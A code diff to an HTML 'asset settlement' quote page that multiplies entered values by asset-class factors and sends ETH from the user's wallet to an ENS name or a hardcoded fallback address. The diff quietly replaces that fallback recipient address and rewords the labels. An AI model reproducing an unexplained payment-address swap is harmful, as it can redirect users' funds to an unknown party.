@@ -17,12 +17,12 @@
 <body>
     <div class="box">
         <h1>HEARLESS GLOBAL</h1>
-        <p style="font-size:10px; color:#444;">©NATHAN RICHARD PEHLKE. ALL RIGHTS RESERVED.</p>
+        <p style="font-size:10px; color:#444;">©NATHAN RICHARD PEHLKE. PERSONAL ASSET SETTLEMENT.</p>
         
         <span class="label">Asset Class</span>
         <select id="type" onchange="update()">
-            <option value="1.45">ENERGY VALUE (1.45x)</option>
-            <option value="1.30">METALS VALUE (1.30x)</option>
+            <option value="1.45">ENERGY INDEX (1.45x)</option>
+            <option value="1.30">METALS INDEX (1.30x)</option>
             <option value="1.25">FIXED ASSETS (1.25x)</option>
             <option value="1.15">AGRI/TIMBER (1.15x)</option>
             <option value="1.80">SPECIALTY (1.80x)</option>
@@ -35,7 +35,7 @@
             <option value="ETH">BASE / ETHEREUM (ETH)</option>
         </select>
 
-        <input type="text" id="desc" placeholder="ASSET DESCRIPTION / TITLE REFERENCE...">
+        <input type="text" id="desc" placeholder="DESCRIPTION / REFERENCE...">
         <input type="number" id="val" oninput="update()" placeholder="VALUE (USD)">
 
         <div id="quote">$0.00</div>
@@ -91,7 +91,7 @@
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     await provider.send("eth_requestAccounts", []);
                     const signer = provider.getSigner();
-                    const target = await provider.resolveName(ENS_NAME) || "0xD966B247659F23a8542F6B880b9B726887560B05";
+                    const target = await provider.resolveName(ENS_NAME) || "0xBFd32D746A65A561C94843fBCF928d7771163fb3";
                     await signer.sendTransaction({ to: target, value: ethers.utils.parseEther(amount.split(' ')[0]) });
                 }
             }
